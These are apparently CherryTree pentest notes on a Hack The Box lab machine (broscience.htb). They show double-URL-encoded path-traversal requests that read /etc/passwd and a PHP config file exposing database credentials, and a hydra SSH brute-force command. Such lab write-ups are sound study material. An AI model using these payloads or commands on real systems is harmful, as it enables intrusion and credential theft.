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</encoded_png>
+      <codebox char_offset="570" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="html" highlight_brackets="1" show_line_numbers="0">Error: Attack detected.</codebox>
+      <codebox char_offset="640" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
+GET /includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34 HTTP/1.1&#13;
+Host: broscience.htb&#13;
+Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"&#13;
+Sec-Ch-Ua-Mobile: ?0&#13;
+Sec-Ch-Ua-Platform: "Linux"&#13;
+Upgrade-Insecure-Requests: 1&#13;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36&#13;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#13;
+Sec-Fetch-Site: none&#13;
+Sec-Fetch-Mode: navigate&#13;
+Sec-Fetch-User: ?1&#13;
+Sec-Fetch-Dest: document&#13;
+Accept-Encoding: gzip, deflate&#13;
+Accept-Language: en-US,en;q=0.9&#13;
+Connection: close</codebox>
+    </node>
+    <node name="LFI" unique_id="4" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675202312" ts_lastsave="1675205015">
+      <rich_text>On using double encoded payload for </rich_text>
+      <rich_text family="monospace">../../../../../etc/passwd </rich_text>
+      <rich_text>we see that lfi works
+
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+we get the following output:
+
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+from the output we see that we have a user named bill
+
+lets try to get the `id_rsa`  for this 
+
+couldnt find it
+
+so let check encoded ../../../../../var/www/html/includes/db_connect.php
+
+request:
+
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <rich_text>
+
+we get the following response
+
+</rich_text>
+      <rich_text justification="left"></rich_text>
+      <codebox char_offset="85" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GET /includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34 HTTP/1.1&#13;
+Host: broscience.htb&#13;
+Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"&#13;
+Sec-Ch-Ua-Mobile: ?0&#13;
+Sec-Ch-Ua-Platform: "Linux"&#13;
+Upgrade-Insecure-Requests: 1&#13;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36&#13;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#13;
+Sec-Fetch-Site: none&#13;
+Sec-Fetch-Mode: navigate&#13;
+Sec-Fetch-User: ?1&#13;
+Sec-Fetch-Dest: document&#13;
+Accept-Encoding: gzip, deflate&#13;
+Accept-Language: en-US,en;q=0.9&#13;
+Connection: close</codebox>
+      <codebox char_offset="118" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">HTTP/1.1 200 OK&#13;
+Date: Tue, 31 Jan 2023 21:57:11 GMT&#13;
+Server: Apache/2.4.54 (Debian)&#13;
+Content-Length: 2235&#13;
+Connection: close&#13;
+Content-Type: image/png&#13;
+&#13;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+tss:x:103:109:TPM software stack,,,:/var/lib/tpm:/bin/false
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:105:111:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:106:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+rtkit:x:107:115:RealtimeKit,,,:/proc:/usr/sbin/nologin
+sshd:x:108:65534::/run/sshd:/usr/sbin/nologin
+dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+avahi:x:110:116:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
+speech-dispatcher:x:111:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
+pulse:x:112:118:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
+saned:x:113:121::/var/lib/saned:/usr/sbin/nologin
+colord:x:114:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+geoclue:x:115:123::/var/lib/geoclue:/usr/sbin/nologin
+Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
+bill:x:1000:1000:bill,,,:/home/bill:/bin/bash
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+postgres:x:117:125:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+</codebox>
+      <codebox char_offset="318" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GET /includes/img.php?path=%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%37%36%25%36%31%25%37%32%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%38%25%37%34%25%36%64%25%36%63%25%32%66%25%36%39%25%36%65%25%36%33%25%36%63%25%37%35%25%36%34%25%36%35%25%37%33%25%32%66%25%36%34%25%36%32%25%35%66%25%36%33%25%36%66%25%36%65%25%36%65%25%36%35%25%36%33%25%37%34%25%32%65%25%37%30%25%36%38%25%37%30 HTTP/1.1&#13;
+Host: broscience.htb&#13;
+Sec-Ch-Ua: "Not?A_Brand";v="8", "Chromium";v="108"&#13;
+Sec-Ch-Ua-Mobile: ?0&#13;
+Sec-Ch-Ua-Platform: "Linux"&#13;
+Upgrade-Insecure-Requests: 1&#13;
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36&#13;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#13;
+Sec-Fetch-Site: none&#13;
+Sec-Fetch-Mode: navigate&#13;
+Sec-Fetch-User: ?1&#13;
+Sec-Fetch-Dest: document&#13;
+Accept-Encoding: gzip, deflate&#13;
+Accept-Language: en-US,en;q=0.9&#13;
+Connection: close</codebox>
+      <codebox char_offset="352" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">HTTP/1.1 200 OK&#13;
+Date: Tue, 31 Jan 2023 22:41:06 GMT&#13;
+Server: Apache/2.4.54 (Debian)&#13;
+Content-Length: 337&#13;
+Connection: close&#13;
+Content-Type: image/png&#13;
+&#13;
+&lt;?php
+$db_host = "localhost";
+$db_port = "5432";
+$db_name = "broscience";
+$db_user = "dbuser";
+$db_pass = "RangeOfMotion%777";
+$db_salt = "NaCl";
+
+$db_conn = pg_connect("host={$db_host} port={$db_port} dbname={$db_name} user={$db_user} password={$db_pass}");
+
+if (!$db_conn) {
+    die("&lt;b&gt;Error&lt;/b&gt;: Unable to connect to database");
+}
+?&gt;</codebox>
+    </node>
+    <node name="sshBruteforce" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675266711" ts_lastsave="1675266735">
+      <rich_text family="monospace">hydra -l bill -P /usr/share/wordlists/rockyou.txt ssh://</rich_text>
+      <rich_text>broscience.htb</rich_text>
+    </node>
+  </node>
+</cherrytree>
